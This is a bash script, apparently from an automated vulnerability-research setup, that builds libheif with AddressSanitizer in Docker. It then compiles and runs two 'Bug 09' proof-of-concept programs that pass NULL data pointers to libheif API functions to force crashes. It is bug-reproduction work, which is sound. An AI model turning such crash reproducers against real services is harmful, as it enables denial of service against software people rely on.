#!/usr/bin/env bash
# build.sh — Build and run Bug 09 POCs inside vulagent/libheif:latest
# Usage: bash build.sh
set -e

DOCKER_IMAGE="vulagent/libheif:latest"

docker run --rm "$DOCKER_IMAGE" bash -c '
set -e

# ── 1. Build libheif static library with AddressSanitizer ──────────────────
echo "[*] Configuring libheif with ASAN..."
mkdir -p /tmp/build_asan
cd /tmp/build_asan
cmake /src/libheif \
  -DCMAKE_CXX_COMPILER=clang++ \
  -DCMAKE_C_COMPILER=clang \
  -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
  -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address" \
  -DBUILD_SHARED_LIBS=OFF \
  -DWITH_EXAMPLES=OFF \
  -DWITH_FUZZERS=OFF \
  -DWITH_LIBDE265=OFF \
  -DWITH_X265=OFF \
  -DWITH_AOM_DECODER=OFF \
  -DWITH_AOM_ENCODER=OFF \
  -DCMAKE_BUILD_TYPE=RelWithDebInfo \
  > /dev/null 2>&1
echo "[*] Building libheif..."
make -j$(nproc) heif > /dev/null 2>&1

# Fix generated header include path
mkdir -p /tmp/build_asan/libheif_inc
ln -sf /tmp/build_asan/libheif /tmp/build_asan/libheif_inc/libheif

INCLUDE_API=/src/libheif/libheif/api
INCLUDE_GEN=/tmp/build_asan/libheif_inc
LIB=/tmp/build_asan/libheif/libheif.a
ASAN_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1"
ZLIB=/usr/lib/x86_64-linux-gnu/libz.so.1

compile() {
    clang++ $ASAN_FLAGS -I$INCLUDE_API -I$INCLUDE_GEN "$1" $LIB $ZLIB -lm -lpthread -ldl -o "$2"
}

# ── 2. Write POC sources ────────────────────────────────────────────────────
cat > /tmp/poc_rfm.cc << '"'"'CPPEOF'"'"'
#include <cstdlib>
#include <cstdio>
#include <libheif/heif.h>
#include <libheif/heif_context.h>
int main() {
    fprintf(stderr, "[+] Bug 09 POC 1: NULL data to heif_context_read_from_memory()\n");
    heif_context* ctx = heif_context_alloc();
    fprintf(stderr, "[+] Calling heif_context_read_from_memory(ctx, NULL, 64, NULL)\n");
    heif_context_read_from_memory(ctx, NULL, 64, NULL);
    fprintf(stderr, "[-] UNEXPECTED: no crash\n");
    heif_context_free(ctx);
    return 0;
}
CPPEOF

cat > /tmp/poc_meta_null.cc << '"'"'CPPEOF'"'"'
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <libheif/heif.h>
#include <libheif/heif_context.h>
#include <libheif/heif_encoding.h>
#include <libheif/heif_image.h>
#include <libheif/heif_image_handle.h>
#include <libheif/heif_metadata.h>
static heif_image_handle* make_handle(heif_context* ctx) {
    heif_image* img = nullptr;
    heif_image_create(4, 4, heif_colorspace_monochrome, heif_chroma_monochrome, &img);
    heif_image_add_plane(img, heif_channel_Y, 4, 4, 8);
    int stride; uint8_t* p = heif_image_get_plane(img, heif_channel_Y, &stride); memset(p, 0, stride*4);
    heif_encoder* enc = nullptr;
    heif_context_get_encoder_for_format(ctx, heif_compression_mask, &enc);
    heif_image_handle* hdl = nullptr;
    heif_context_encode_image(ctx, img, enc, nullptr, &hdl);
    heif_encoder_release(enc); heif_image_release(img);
    return hdl;
}
int main() {
    fprintf(stderr, "[+] Bug 09 POC 2: NULL data to heif_context_add_generic_metadata()\n");
    heif_context* ctx = heif_context_alloc();
    heif_image_handle* hdl = make_handle(ctx);
    if (!hdl) { fprintf(stderr, "[-] handle failed\n"); return 1; }
    fprintf(stderr, "[+] Calling heif_context_add_generic_metadata(ctx, hdl, NULL, 64, ...)\n");
    heif_context_add_generic_metadata(ctx, hdl, NULL, 64, "test", "text/plain");
    fprintf(stderr, "[-] UNEXPECTED: no crash\n");
    heif_image_handle_release(hdl); heif_context_free(ctx);
    return 0;
}
CPPEOF

# ── 3. Compile ─────────────────────────────────────────────────────────────
echo "[*] Compiling POC 1 (poc_read_from_memory)..."
compile /tmp/poc_rfm.cc /tmp/bin_rfm
echo "[*] Compiling POC 2 (poc_add_metadata_null)..."
compile /tmp/poc_meta_null.cc /tmp/bin_meta_null

# ── 4. Run ─────────────────────────────────────────────────────────────────
echo ""
echo "=== POC 1: heif_context_read_from_memory(ctx, NULL, 64, NULL) ==="
/tmp/bin_rfm 2>&1 || true
echo ""
echo "=== POC 2: heif_context_add_generic_metadata(ctx, hdl, NULL, 64, ...) ==="
/tmp/bin_meta_null 2>&1 || true
'
